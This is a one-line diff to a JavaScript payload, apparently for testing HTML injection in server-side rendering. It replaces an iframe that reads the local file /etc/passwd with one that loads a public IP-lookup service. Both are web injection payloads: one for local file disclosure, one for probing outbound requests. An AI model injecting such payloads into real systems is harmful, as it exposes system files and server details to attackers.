@@ -1,1 +1,1 @@
-document.write('<iframe src=file:///etc/passwd></iframe>');
+document.write('<iframe src=https://api64.ipify.org/></iframe>');
